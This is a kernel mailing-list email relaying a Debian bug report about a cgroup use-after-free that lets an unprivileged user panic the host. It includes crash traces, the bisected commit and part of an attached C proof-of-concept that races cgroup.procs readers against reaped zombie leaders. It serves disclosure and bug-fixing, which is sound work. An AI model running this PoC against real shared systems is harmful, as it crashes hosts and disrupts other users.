Received: from stravinsky.debian.org (stravinsky.debian.org [82.195.75.108])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 72C86F9C0;
	Sat, 15 Aug 2026 19:41:38 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=82.195.75.108
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786822901; cv=none; b=d0/9UgGv0qWjR0+EefaZBEJpU1Hg3rS/B7T1PTwp967j6/8vBctKf+P6KgRiwhOJXS1PsGyO5CNcuGzTcFXqeDT/rHSTrSyFcPX1MDt135QzAPIwJcAuNJydObtXV3jAGeBKL+WCyzwzq8aXrhh77vAsbOMVf1WJSUivcqcfMCI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786822901; c=relaxed/simple;
	bh=s1dF4Q+fIlKNxGLetKVNzjS76A3e2W1d+F/SZJ/H9a0=;
	h=Date:From:To:Cc:Subject:Message-ID:MIME-Version:Content-Type:
	 Content-Disposition:In-Reply-To; b=NIG+Luq8W2YyZUvF/AwtHZEf+Djr7mRfIn1ga8wVA7TP3NN5t4UJWCWjNdrl4kO/yjN5eIp+/mR2BiAbG+5soo/iC4OzZtAl/Gz5eE14NdjelyG+WfRp+WSTvpGyq1xBaeS8Gd6ZbqBxFtubhGp2uyFkXLM01NZ11p/p72DH1Jw=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=debian.org; spf=pass smtp.mailfrom=debian.org; dkim=pass (2048-bit key) header.d=debian.org header.i=@debian.org header.b=s0dvdBz8; arc=none smtp.client-ip=82.195.75.108
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=debian.org
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=debian.org
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=debian.org header.i=@debian.org header.b="s0dvdBz8"
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=debian.org;
	s=smtpauto.stravinsky; h=X-Debian-User:In-Reply-To:Content-Type:MIME-Version:
	Message-ID:Subject:Cc:To:From:Date:Reply-To:Content-Transfer-Encoding:
	Content-ID:Content-Description:References;
	bh=/4TDaP5zjOCOzuygsrBrik7fmaLP+eAcKnffJ2WSX6c=; b=s0dvdBz8hSoW2SxYZlJkY6/euI
	ljs05AdJTaREYT6Yt2NcTx4WxHrrN26LMuS32mJVyRVFC8WuZXlHuyml9+4IvaKpHRZ/LUw7JGor+
	haQKBCk9/2mdbZ9+QEPlybcv6pb5LUdd+m0VDwqBpotiRZn/zC+FNOg78ent1jLUlCAXywd28d1mI
	+GNke++4ebaHpuPc4pFzFtCvqkltOVUbSCz9Iy5YTbc5XafmVNn0vRriEN5PmScUk5X+Td02CQYk/
	wQnIlKoXpCQbOCt1HIdrcB9ZicokWWfI/QfJC+QyoB8ZQpKaxCYZMHBsaLwwaryv7JnUhjuGen6IH
	ErEt3rbA==;
Received: from authenticated-user
	by stravinsky.debian.org with esmtpsa (TLS1.3:ECDHE_X25519__RSA_PSS_RSAE_SHA256__AES_256_GCM:256)
	(Exim 4.96)
	(envelope-from <carnil@debian.org>)
	id 1wvKFm-006uCS-3A;
	Sat, 15 Aug 2026 19:41:15 +0000
Received: by eldamar.lan (Postfix, from userid 1000)
	id 364ACBE2DE0; Sat, 15 Aug 2026 21:41:14 +0200 (CEST)
Date: Sat, 15 Aug 2026 21:41:14 +0200
From: Salvatore Bonaccorso <carnil@debian.org>
To: Noah Elias Feldt <N.Feldt@mittwald.de>, Tejun Heo <tj@kernel.org>,
	Johannes Weiner <hannes@cmpxchg.org>,
	Michal =?iso-8859-1?Q?Koutn=FD?= <mkoutny@suse.com>,
	Dan Schatzberg <dschatzberg@meta.com>,
	Peter Zijlstra <peterz@infradead.org>
Cc: 1144314@bugs.debian.org, cgroups@vger.kernel.org,
	linux-kernel@vger.kernel.org, regressions@lists.linux.dev,
	stable@vger.kernel.org
Subject: refcount_t: addition on 0; use-after-free, regression from
 260fbcb92bbe ("cgroup: Move dying_tasks cleanup from cgroup_task_release()
 to cgroup_task_free()")
Message-ID: <178682274912.1759826.11422695267451330087@eldamar.lan>
Precedence: bulk
X-Mailing-List: cgroups@vger.kernel.org
List-Id: <cgroups.vger.kernel.org>
List-Subscribe: <mailto:cgroups+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:cgroups+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="Tp3jkGR3ToKG1RWu"
Content-Disposition: inline
In-Reply-To: <FR6P281MB6118B1A758F3278BC9BA795AF0DB2@FR6P281MB6118.DEUP281.PROD.OUTLOOK.COM>
X-Debian-User: carnil

--Tp3jkGR3ToKG1RWu
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Control: forwarded -1 https://lore.kernel.org/regressions/178682274912.1759826.11422695267451330087@eldamar.lan

Hi Tejun, Johannes and Michael,

In Debian Noah Elias Feldt reported a UAF which is hit in production
and provided a reproducer for the issue (attached as well), the
bugreport can be found at https://bugs.debian.org/1144314 . First
quoting the orignal post:

On Thu, Aug 13, 2026 at 02:38:34PM +0000, Noah Elias Feldt wrote:
> Subject: linux-binary-7.1.3+deb13-amd64: unprivileged user-triggerable use-after-free host panic
> Package: src:linux
> X-Debbugs-Cc: n.feldt@mittwald.de
> Version: 7.1.3-1~bpo13+1
> Severity: important
> 
> Dear Maintainer,
> 
> An unprivileged local user can panic the entire host. Reading a cgroup's
> world-readable cgroup.procs triggers a use-after-free of struct task_struct in
> css_task_iter_next(), ending in "Kernel panic - not syncing: Fatal exception in
> interrupt".
> Nodes hard-panic and reboot organically under normal load on
> the affected kernel. It also reproduces deterministically within seconds with
> the attached PoC as an ordinary user (no root, no capabilities, no namespaces).
> 
> *** Reporter, please consider answering these questions, where appropriate ***
> 
>    * What led up to the situation?
>      An unprivileged process reads its own world-readable cgroup.procs while,
>      on the same CPU, thread-group leaders in that cgroup exit and are
>      mass-reaped (attached poc.c). Not only synthetic: several of our production
>      nodes have already panicked this way organically under normal container
>      workload (Kubernetes / cri-o) on the affected kernel.
> 
>    * What exactly did you do?
>      Ran the reproducer as an ordinary user on an Debian 13 KVM guest
>      (trixie-backports kernel)
> 
>    * What was the outcome?
>      In ~12-70 s: "refcount_t: addition on 0" in css_task_iter_next()
>      (get_task_struct on usage==0) -> premature free -> NULL rcu_head.func in
>      rcu_do_batch (RIP:0x0) -> "Kernel panic - not syncing". Host dead -- same
>      signature as the organic production panics. Full trace attached (dmesg.log).
> 
>    * What outcome did you expect instead?
>      Reading cgroup.procs must never crash the host.
> 
> -- Package-specific info:
> ** Version:
> Linux version 7.1.3+deb13-amd64 (debian-kernel@lists.debian.org) (x86_64-linux-gnu-gcc-14 (Debian 14.2.0-19) 14.2.0, GNU ld (GNU Binutils for Debian) 2.44) #1 SMP PREEMPT_DYNAMIC Debian 7.1.3-1~bpo13+1 (2026-07-12)
> 
> ** Command line:
> BOOT_IMAGE=/boot/vmlinuz-7.1.3+deb13-amd64 root=PARTUUID=2d450ecb-3079-4437-bfb2-753908b0375b ro console=tty0 console=ttyS0,115200 earlyprintk=ttyS0,115200 consoleblank=0

With an additional reproducer provided by Noah, I could bisect the
change down to 

	commit 260fbcb92bbeacfcd050410fdc2d24ab15044400
	Author: Tejun Heo <tj@kernel.org>
	Date:   Tue Oct 28 20:19:16 2025 -1000

	    cgroup: Move dying_tasks cleanup from cgroup_task_release() to cgroup_task_free()

	    Currently, cgroup_task_exit() adds thread group leaders with live member
	    threads to their css_set's dying_tasks list (so cgroup.procs iteration can
	    still see the leader), and cgroup_task_release() later removes them with
	    list_del_init(&task->cg_list).

	    An upcoming patch will defer the dying_tasks list addition, moving it from
	    cgroup_task_exit() (called from do_exit()) to a new function called from
	    finish_task_switch(). However, release_task() (which calls
	    cgroup_task_release()) can run either before or after finish_task_switch(),
	    creating a race where cgroup_task_release() might try to remove the task from
	    dying_tasks before or while it's being added.

	    Move the list_del_init() from cgroup_task_release() to cgroup_task_free() to
	    fix this race. cgroup_task_free() runs from __put_task_struct(), which is
	    always after both paths, making the cleanup safe.

	    Cc: Dan Schatzberg <dschatzberg@meta.com>
	    Cc: Peter Zijlstra <peterz@infradead.org>
	    Signed-off-by: Tejun Heo <tj@kernel.org>

But there was the suspect that the matching commit might be
d245698d727a ("cgroup: Defer task cgroup unlink until after the task
is done switching out").

Using the provided reproducer in the Debian bug this leads to:

[ 2686.174523] ------------[ cut here ]------------
[ 2686.175443] refcount_t: addition on 0; use-after-free.
[ 2686.176414] WARNING: lib/refcount.c:25 at refcount_warn_saturate+0x6a/0x90, CPU#0: 1144314-poc/1170
[ 2686.178044] Modules linked in: binfmt_misc intel_rapl_msr intel_rapl_common kvm_amd ccp iTCO_wdt intel_pmc_bxt watchdog kvm i2c_i801 vga16fb i2c_smbus vgastate irqbypass lpc_ich pcspkr virtio_net button virtio_balloon net_failover failover joydev evdev nfsd auth_rpcgss nfs_acl lockd grace sunrpc drm efi_pstore configfs vsock_loopback vmw_vsock_virtio_transport vmw_vsock_virtio_transport_common vsock ext4 crc16 mbcache jbd2 crc32c_cryptoapi ahci xhci_pci libahci xhci_hcd libata usbcore scsi_mod psmouse virtio_blk scsi_common usb_common serio_raw dm_mirror dm_region_hash dm_log dm_mod qemu_fw_cfg virtio_rng autofs4 aesni_intel gf128mul
[ 2686.187398] CPU: 0 UID: 1000 PID: 1170 Comm: 1144314-poc Not tainted 7.2-amd64 #1 PREEMPT(lazy)  Debian 7.2~rc7-1~exp1 
[ 2686.189214] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 2686.190800] RIP: 0010:refcount_warn_saturate+0x6a/0x90
[ 2686.191731] Code: 00 48 8d 3d 88 8f 8d 01 67 48 0f b9 3a e9 2e 37 73 00 48 8d 3d 87 8f 8d 01 67 48 0f b9 3a e9 1d 37 73 00 48 8d 3d 86 8f 8d 01 <67> 48 0f b9 3a e9 0c 37 73 00 48 8d 3d 85 8f 8d 01 67 48 0f b9 3a
[ 2686.194789] RSP: 0018:ffffcb9443cafa40 EFLAGS: 00010046
[ 2686.195752] RAX: ffff8b12532c8fa8 RBX: ffff8b1265ae6018 RCX: 0000000000000025
[ 2686.197023] RDX: 0000000000000000 RSI: 0000000000000002 RDI: ffffffffb15746b0
[ 2686.198268] RBP: 0000000000000206 R08: 0000000000000007 R09: 0000000000000004
[ 2686.199530] R10: ffff8b12673b3c40 R11: 0000000000000fdd R12: ffffcb9443cafb08
[ 2686.200782] R13: ffff8b1253899b40 R14: ffff8b124fbf0000 R15: 0000000000000000
[ 2686.202029] FS:  00007f0fff4266c0(0000) GS:ffff8b1309d55000(0000) knlGS:0000000000000000
[ 2686.203462] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2686.204506] CR2: 00005639b734d010 CR3: 0000000115a8d000 CR4: 0000000000350ef0
[ 2686.205780] Call Trace:
[ 2686.206308]  <TASK>
[ 2686.206781]  css_task_iter_next+0xcc/0xf0
[ 2686.207552]  kernfs_seq_next+0x2a/0xa0
[ 2686.208291]  ? cgroup_procs_show+0x2a/0x40
[ 2686.209075]  seq_read_iter+0x2f5/0x490
[ 2686.209798]  vfs_read+0x268/0x390
[ 2686.210454]  ksys_read+0x73/0xf0
[ 2686.211114]  do_syscall_64+0xe1/0x640
[ 2686.211828]  ? do_syscall_64+0x11e/0x640
[ 2686.212580]  ? kernfs_seq_start+0x53/0xb0
[ 2686.213340]  ? __pfx_cgroup_seqfile_stop+0x10/0x10
[ 2686.214233]  ? __mod_memcg_state+0xd7/0x1d0
[ 2686.215035]  ? seq_read_iter+0x214/0x490
[ 2686.215782]  ? __memcg_slab_free_hook+0x16c/0x1c0
[ 2686.216664]  ? __memcg_slab_free_hook+0x16c/0x1c0
[ 2686.217594]  ? kmem_cache_free+0x25f/0x440
[ 2686.218490]  ? __x64_sys_close+0x3d/0x80
[ 2686.219281]  ? do_syscall_64+0x11e/0x640
[ 2686.220044]  ? __mod_memcg_state+0xd7/0x1d0
[ 2686.220839]  ? __memcg_slab_free_hook+0x16c/0x1c0
[ 2686.221719]  ? __memcg_slab_free_hook+0x16c/0x1c0
[ 2686.222616]  ? kmem_cache_free+0x25f/0x440
[ 2686.223403]  ? __x64_sys_close+0x3d/0x80
[ 2686.224167]  ? do_syscall_64+0x11e/0x640
[ 2686.224927]  ? do_syscall_64+0x11e/0x640
[ 2686.225686]  ? do_syscall_64+0x11e/0x640
[ 2686.226446]  ? do_syscall_64+0x98/0x640
[ 2686.227193]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[ 2686.228121] RIP: 0033:0x7f1010cea19e
[ 2686.228828] Code: 08 0f 85 35 4a ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 90 48 83 ec 08 bf 01 00 00 00 e8 82 dc 05 00 bf 01 00 00 00 89
[ 2686.231921] RSP: 002b:00007f0fff415e08 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
[ 2686.233234] RAX: ffffffffffffffda RBX: 00007f0fff4266c0 RCX: 00007f1010cea19e
[ 2686.234465] RDX: 0000000000010000 RSI: 00007f0fff415e90 RDI: 0000000000000029
[ 2686.235710] RBP: 00007f0fff425ea0 R08: 0000000000000000 R09: 0000000000000000
[ 2686.236959] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffc3405bde0
[ 2686.238197] R13: 00007ffc3405bed6 R14: 00007f0fff426ce4 R15: 00007f0ffec26000
[ 2686.239444]  </TASK>
[ 2686.239922] ---[ end trace 0000000000000000 ]---
[ 2686.244408] ------------[ cut here ]------------
[ 2686.245246] WARNING: kernel/fork.c:790 at __put_task_struct+0x150/0x1c0, CPU#0: 1144314-poc/1164
[ 2686.246763] Modules linked in: binfmt_misc intel_rapl_msr intel_rapl_common kvm_amd ccp iTCO_wdt intel_pmc_bxt watchdog kvm i2c_i801 vga16fb i2c_smbus vgastate irqbypass lpc_ich pcspkr virtio_net button virtio_balloon net_failover failover joydev evdev nfsd auth_rpcgss nfs_acl lockd grace sunrpc drm efi_pstore configfs vsock_loopback vmw_vsock_virtio_transport vmw_vsock_virtio_transport_common vsock ext4 crc16 mbcache jbd2 crc32c_cryptoapi ahci xhci_pci libahci xhci_hcd libata usbcore scsi_mod psmouse virtio_blk scsi_common usb_common serio_raw dm_mirror dm_region_hash dm_log dm_mod qemu_fw_cfg virtio_rng autofs4 aesni_intel gf128mul
[ 2686.255681] CPU: 0 UID: 1000 PID: 1164 Comm: 1144314-poc Tainted: G        W           7.2-amd64 #1 PREEMPT(lazy)  Debian 7.2~rc7-1~exp1 
[ 2686.257660] Tainted: [W]=WARN
[ 2686.258228] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 2686.259718] RIP: 0010:__put_task_struct+0x150/0x1c0
[ 2686.260570] Code: fe ff ff 48 89 cf be 03 00 00 00 e8 7a 73 72 00 48 89 df 48 83 c4 08 5b e9 2d fe ff ff 0f 0b 8b 43 28 85 c0 0f 84 da fe ff ff <0f> 0b 65 48 3b 1d ae ec 94 02 0f 85 d8 fe ff ff 0f 0b e9 d1 fe ff
[ 2686.263431] RSP: 0018:ffffcb9440003ed0 EFLAGS: 00010286
[ 2686.264319] RAX: 00000000c0000000 RBX: ffff8b12532c8000 RCX: ffff8b124022fac0
[ 2686.265494] RDX: ffffffffaf5743e0 RSI: 0000000000000001 RDI: ffff8b12532c8000
[ 2686.266667] RBP: ffff8b12bbc33500 R08: ffff8b125368b700 R09: ffffffffaf66e8e3
[ 2686.267832] R10: fffff61cc44da200 R11: ffff8b124022a700 R12: ffffcb9440003f10
[ 2686.269010] R13: ffff8b12468cb700 R14: 0000000000000003 R15: 0000000000000000
[ 2686.270176] FS:  00007f100242c6c0(0000) GS:ffff8b1309d55000(0000) knlGS:0000000000000000
[ 2686.271594] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2686.272640] CR2: 00007f9e074e6b20 CR3: 0000000115a8d000 CR4: 0000000000350ef0
[ 2686.273817] Call Trace:
[ 2686.274307]  <IRQ>
[ 2686.274744]  rcu_do_batch+0x1b3/0x4f0
[ 2686.275413]  rcu_core+0x131/0x2b0
[ 2686.276030]  handle_softirqs+0xd8/0x310
[ 2686.276734]  ? clockevents_program_event+0xf5/0x1e0
[ 2686.277577]  __irq_exit_rcu+0x9e/0xf0
[ 2686.278243]  sysvec_apic_timer_interrupt+0x71/0x90
[ 2686.279087]  </IRQ>
[ 2686.279527]  <TASK>
[ 2686.279968]  asm_sysvec_apic_timer_interrupt+0x1a/0x20
[ 2686.280856] RIP: 0010:_raw_spin_unlock_irqrestore+0x1d/0x40
[ 2686.281795] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 f3 0f 1e fa 0f 1f 44 00 00 e8 f2 07 00 00 90 f7 c6 00 02 00 00 74 06 fb 0f 1f 44 00 00 <65> ff 0d 5c 66 af 01 74 05 e9 65 24 00 00 e8 10 2d 0e ff e9 5b 24
[ 2686.284661] RSP: 0018:ffffcb9443c7fcf0 EFLAGS: 00000206
[ 2686.285549] RAX: 0000000000000001 RBX: ffff8b1265ae0558 RCX: ffff8b1261d4ac00
[ 2686.286727] RDX: ffff8b12485b5330 RSI: 0000000000000206 RDI: ffffffffb1f81d88
[ 2686.287891] RBP: 0000000000000206 R08: 0000000000000003 R09: 0000000000000004
[ 2686.289065] R10: ffff8b12673b3f50 R11: 0000000000000ff1 R12: ffffcb9443c7fdb8
[ 2686.290230] R13: ffff8b12665eb180 R14: ffff8b1240338000 R15: 0000000000000000
[ 2686.291402]  css_task_iter_next+0x95/0xf0
[ 2686.292117]  kernfs_seq_next+0x2a/0xa0
[ 2686.292806]  ? cgroup_procs_show+0x2a/0x40
[ 2686.293534]  seq_read_iter+0x2f5/0x490
[ 2686.294217]  vfs_read+0x268/0x390
[ 2686.294842]  ksys_read+0x73/0xf0
[ 2686.295447]  do_syscall_64+0xe1/0x640
[ 2686.296114]  ? kmem_cache_free+0x25f/0x440
[ 2686.296851]  ? __x64_sys_close+0x3d/0x80
[ 2686.297554]  ? do_syscall_64+0x11e/0x640
[ 2686.298257]  ? do_syscall_64+0x11e/0x640
[ 2686.298967]  ? do_syscall_64+0x11e/0x640
[ 2686.299777]  ? do_syscall_64+0x98/0x640
[ 2686.300606]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[ 2686.301529] RIP: 0033:0x7f1010cea19e
[ 2686.302231] Code: 08 0f 85 35 4a ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 90 48 83 ec 08 bf 01 00 00 00 e8 82 dc 05 00 bf 01 00 00 00 89
[ 2686.305341] RSP: 002b:00007f100241be08 EFLAGS: 00000246 ORIG_RAX: 0000000000000000
[ 2686.306708] RAX: ffffffffffffffda RBX: 00007f100242c6c0 RCX: 00007f1010cea19e
[ 2686.308108] RDX: 0000000000010000 RSI: 00007f100241be90 RDI: 000000000000002a
[ 2686.309527] RBP: 00007f100242bea0 R08: 0000000000000000 R09: 0000000000000000
[ 2686.310935] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffc3405bde0
[ 2686.312388] R13: 00007ffc3405bed6 R14: 00007f100242cce4 R15: 00007f1001c2c000
[ 2686.313805]  </TASK>
[ 2686.314326] ---[ end trace 0000000000000000 ]---
[ 2691.097916]  slab task_struct start ffff8b12532c8000 pointer offset 2600 size 7040
[ 2691.099234] list_del corruption. next->prev should be ffff8b124f3e0a28, but was ffff8b12514d8a28. (next=ffff8b12532c8a28)
[ 2691.101069] ------------[ cut here ]------------
[ 2691.101915] kernel BUG at lib/list_debug.c:65!
[ 2691.102745] Oops: invalid opcode: 0000 [#1] SMP NOPTI
[ 2691.103662] CPU: 0 UID: 1000 PID: 9204 Comm: 1144314-poc Tainted: G        W           7.2-amd64 #1 PREEMPT(lazy)  Debian 7.2~rc7-1~exp1 
[ 2691.105695] Tainted: [W]=WARN
[ 2691.106288] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 2691.107892] RIP: 0010:__list_del_entry_valid_or_report+0x10a/0x120
[ 2691.108989] Code: 89 d7 48 89 14 24 e8 25 3c be ff 48 8b 14 24 48 8b 74 24 08 48 c7 c7 18 12 a7 b0 48 8b 42 08 48 89 d1 48 89 c2 e8 b6 d1 74 ff <0f> 0b 66 2e 0f 1f 84 00 00 00 00 00 66 2e 0f 1f 84 00 00 00 00 00
[ 2691.112049] RSP: 0018:ffffcb944927fb68 EFLAGS: 00010046
[ 2691.112991] RAX: 000000000000006d RBX: 0000000000000011 RCX: 0000000000000027
[ 2691.114228] RDX: 0000000000000000 RSI: 0000000000000001 RDI: ffff8b12bbc1d100
[ 2691.115474] RBP: ffff8b124f306300 R08: 0000000000000000 R09: ffffcb944927fa10
[ 2691.116712] R10: ffffffffb12f24b0 R11: 3fffffffffffefff R12: ffff8b1241f5d540
[ 2691.117950] R13: ffff8b124f3e4250 R14: ffff8b12508f8d80 R15: ffff8b124f3e0000
[ 2691.119196] FS:  0000000000000000(0000) GS:ffff8b1309d55000(0000) knlGS:0000000000000000
[ 2691.120587] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2691.121611] CR2: 00007f1010e48000 CR3: 0000000161e2a000 CR4: 0000000000350ef0
[ 2691.122857] Call Trace:
[ 2691.123372]  <TASK>
[ 2691.123834]  release_task+0x436/0x560
[ 2691.124539]  do_exit+0x6a2/0xaa0
[ 2691.125178]  do_group_exit+0x2d/0xc0
[ 2691.125868]  __x64_sys_exit_group+0x18/0x20
[ 2691.126662]  x64_sys_call+0x102c/0x1530
[ 2691.127393]  do_syscall_64+0xe1/0x640
[ 2691.128098]  ? file_update_time_flags+0x81/0x110
[ 2691.128951]  ? fault_dirty_shared_page+0xa2/0x160
[ 2691.129816]  ? do_fault+0x146/0x580
[ 2691.130493]  ? __pte_offset_map+0x1b/0x100
[ 2691.131273]  ? __handle_mm_fault+0x960/0xf60
[ 2691.132074]  ? count_memcg_events+0xd9/0x210
[ 2691.132875]  ? handle_mm_fault+0x1e5/0x2f0
[ 2691.133643]  ? do_user_addr_fault+0x2b4/0x7b0
[ 2691.134456]  ? irqentry_exit+0x43/0x730
[ 2691.135194]  ? do_syscall_64+0x98/0x640
[ 2691.135927]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[ 2691.136843] RIP: 0033:0x7f1010d2c438
[ 2691.137540] Code: Unable to access opcode bytes at 0x7f1010d2c40e.
[ 2691.138633] RSP: 002b:00007ffc3405bf98 EFLAGS: 00000202 ORIG_RAX: 00000000000000e7
[ 2691.139859] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f1010d2c438
[ 2691.141027] RDX: 0000000000000002 RSI: ffffffffffffffb0 RDI: 0000000000000000
[ 2691.142186] RBP: 00007ffc3405bfb0 R08: 0000000000000000 R09: 0000000000000000
[ 2691.143352] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000000003e8
[ 2691.144512] R13: 0000000000000002 R14: 0000000000000030 R15: 00005639b734cdd8
[ 2691.145673]  </TASK>
[ 2691.146124] Modules linked in: binfmt_misc intel_rapl_msr intel_rapl_common kvm_amd ccp iTCO_wdt intel_pmc_bxt watchdog kvm i2c_i801 vga16fb i2c_smbus vgastate irqbypass lpc_ich pcspkr virtio_net button virtio_balloon net_failover failover joydev evdev nfsd auth_rpcgss nfs_acl lockd grace sunrpc drm efi_pstore configfs vsock_loopback vmw_vsock_virtio_transport vmw_vsock_virtio_transport_common vsock ext4 crc16 mbcache jbd2 crc32c_cryptoapi ahci xhci_pci libahci xhci_hcd libata usbcore scsi_mod psmouse virtio_blk scsi_common usb_common serio_raw dm_mirror dm_region_hash dm_log dm_mod qemu_fw_cfg virtio_rng autofs4 aesni_intel gf128mul
[ 2691.154482] ---[ end trace 0000000000000000 ]---
[ 2691.155292] RIP: 0010:__list_del_entry_valid_or_report+0x10a/0x120
[ 2691.156315] Code: 89 d7 48 89 14 24 e8 25 3c be ff 48 8b 14 24 48 8b 74 24 08 48 c7 c7 18 12 a7 b0 48 8b 42 08 48 89 d1 48 89 c2 e8 b6 d1 74 ff <0f> 0b 66 2e 0f 1f 84 00 00 00 00 00 66 2e 0f 1f 84 00 00 00 00 00
[ 2691.159161] RSP: 0018:ffffcb944927fb68 EFLAGS: 00010046
[ 2691.160045] RAX: 000000000000006d RBX: 0000000000000011 RCX: 0000000000000027
[ 2691.161204] RDX: 0000000000000000 RSI: 0000000000000001 RDI: ffff8b12bbc1d100
[ 2691.162364] RBP: ffff8b124f306300 R08: 0000000000000000 R09: ffffcb944927fa10
[ 2691.163532] R10: ffffffffb12f24b0 R11: 3fffffffffffefff R12: ffff8b1241f5d540
[ 2691.164691] R13: ffff8b124f3e4250 R14: ffff8b12508f8d80 R15: ffff8b124f3e0000
[ 2691.165852] FS:  0000000000000000(0000) GS:ffff8b1309d55000(0000) knlGS:0000000000000000
[ 2691.167168] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 2691.168129] CR2: 00007f1010e48000 CR3: 0000000161e2a000 CR4: 0000000000350ef0
[ 2691.169290] note: 1144314-poc[9204] exited with irqs disabled
[ 2691.170276] note: 1144314-poc[9204] exited with preempt_count 3
[ 2691.171334] Fixing recursive fault but reboot is needed!

#regzbot introduced: 260fbcb92bbeacfcd050410fdc2d24ab15044400
#regzbot link: https://bugs.debian.org/1144314

Noah Elias Feldt is added here as well to provide more information as
needed.

Regards,
Salvatore

--Tp3jkGR3ToKG1RWu
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename=1144314-poc.c

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <unistd.h>

static int PIN_CPU  = 0;
static int READERS  = 48;
static int M        = 1000;
static int PARALLEL = 2;

static char cg_procs[600];
static char cg_threads[600];
static int *arrived;

static void pin_self(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(PIN_CPU, &s);
    if (sched_setaffinity(0, sizeof s, &s) != 0) {   // inherited across fork()/pthread_create()
        fprintf(stderr, "poc: cannot confine to cpu %d: %s\n"
            "poc: pick a CPU that is online and allowed here "
            "(Cpus_allowed_list in /proc/self/status)\n",
            PIN_CPU, strerror(errno));
        _exit(1);
    }
}

static int verify_pinned(void)
{
    cpu_set_t s;
    CPU_ZERO(&s);
    if (sched_getaffinity(0, sizeof s, &s) != 0) {
        fprintf(stderr, "poc: sched_getaffinity: %s\n", strerror(errno));
        _exit(1);
    }
    if (CPU_COUNT(&s) != 1 || !CPU_ISSET(PIN_CPU, &s)) {
        fprintf(stderr, "poc: not confined to cpu %d -- %d CPUs still allowed\n",
            PIN_CPU, CPU_COUNT(&s));
        _exit(1);
    }
    return sched_getcpu();
}

static void find_cgroup(void)
{
    char buf[1024] = {0};
    int fd = open("/proc/self/cgroup", O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, buf, sizeof buf - 1);
        if (n > 0)
            buf[n] = 0;
        close(fd);
    }
    char path[512] = "/";
    char *p = strstr(buf, "0::");
    if (p) {
        p += 3;
        char *e = strchr(p, '\n');
        if (e)
            *e = 0;
        snprintf(path, sizeof path, "%s", p);
    }
    snprintf(cg_procs, sizeof cg_procs, "/sys/fs/cgroup%s/cgroup.procs", path);
    snprintf(cg_threads, sizeof cg_threads, "/sys/fs/cgroup%s/cgroup.threads", path);
}

static void *reader(void *a)
{
    (void)a;
    pin_self();
    char buf[1 << 16];
    for (;;) {
        int fd = open(cg_procs, O_RDONLY);
        if (fd >= 0) {
            while (read(fd, buf, sizeof buf) > 0)
                ;
            close(fd);
        }
        fd = open(cg_threads, O_RDONLY);
        if (fd >= 0) {
            while (read(fd, buf, sizeof buf) > 0)
                ;
            close(fd);
        }
    }
    return 0;
}

static void *worker(void *a)
{
    (void)a;
    usleep(2000);
    return 0;
}
static void barrier_wait(void)
{
    __atomic_add_fetch(arrived, 1, __ATOMIC_SEQ_CST);
    for (int i = 0; i < 10000; i++) {
        if (__atomic_load_n(arrived, __ATOMIC_SEQ_CST) >= PARALLEL)
            return;
        usleep(200);
    }
}
static void zombie_factory(void)
{
    pin_self();
    // Undo the reaper's inherited SIG_IGN: with SIGCHLD ignored *here*, each
    // leader would be autoreaped by its own last worker's release_task() (the
    // zap_leader path) instead of piling up for the burst.
    signal(SIGCHLD, SIG_DFL);

    pthread_attr_t at;
    pthread_attr_init(&at);
    pthread_attr_setstacksize(&at, 64 * 1024);

    for (int i = 0; i < M; i++) {
        if (fork() == 0) {
            pthread_t t;
            if (pthread_create(&t, &at, worker, 0) == 0)
                pthread_detach(t);
            pthread_exit(0);   // leader zombifies; process ends with the worker
        }
        // non-reaping parent: no wait()
    }
    pthread_attr_destroy(&at);

    usleep(30000);      // let them collapse onto dying_tasks before the reap
    barrier_wait();     // ... then everyone bursts at once
}
static void run_reaper(void)
{
